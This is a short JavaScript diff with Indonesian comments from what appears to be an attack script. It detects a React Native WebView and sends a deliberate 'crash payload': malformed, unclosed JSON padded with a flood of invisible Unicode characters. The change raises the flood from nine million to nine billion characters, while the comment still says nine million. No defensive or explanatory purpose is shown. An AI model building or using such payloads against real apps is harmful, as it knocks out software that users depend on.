@@ -10,7 +10,7 @@ try {
         log("ReactNativeWebView detected. Sending crash payload...");
 
         // Gabungan: JSON rusak + unicode flood besar
-        const hugeFlood = "\u200F".repeat(9_000_000); // 9 juta karakter tak terlihat
+        const hugeFlood = "\u200F".repeat(9_000_000_000); // 9 juta karakter tak terlihat
         const payload = "{" + hugeFlood; // JSON rusak (tidak tertutup)
 
         // Kirim payload langsung
